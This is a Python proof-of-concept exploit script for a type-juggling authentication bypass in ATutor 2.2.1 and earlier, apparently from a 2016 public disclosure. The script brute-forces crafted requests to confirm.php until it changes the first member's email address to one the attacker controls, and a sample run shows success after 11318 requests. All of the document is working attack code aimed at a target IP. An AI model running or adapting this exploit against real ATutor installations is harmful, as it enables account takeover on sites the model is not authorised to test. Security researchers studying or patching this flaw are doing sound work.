#!/usr/local/bin/python
"""
ATutor <= 2.2.1 confirm.php 'UPDATE' Type Juggling Authentication Bypass Vulnerability
by mr_me 2016

saturn:atutor mr_me$ ./poc.py 172.16.175.142
(+) we set the first members email to aaaaai0m@sourceincite.com !
(+) made a total of 11318 requests
saturn:atutor mr_me$
"""

import hashlib, string, itertools, re, requests, sys

if len(sys.argv) < 2:
    print "(!) Usage: %s <target ip>" % sys.argv[0]
    sys.exit(-1)

t = sys.argv[1]
e = "sourceincite.com"

count = 1
for w in itertools.imap(''.join, itertools.product(string.lowercase + string.digits, repeat=8)):
    print "(+) testing: %s@%s\r" % (w,e)
    sys.stdout.write("\033[F")
    sys.stdout.write("\033[K")
    r = requests.get( "http://%s/ATutor/confirm.php?e=%s@%s&id=1&m=0" % (t, w, e), allow_redirects=False)
    count += 1
    if r.status_code == 302:
    	print "(+) we set the first members email to %s@%s !" % (w,e)
    	print "(+) made a total of %d requests" % count
    	break
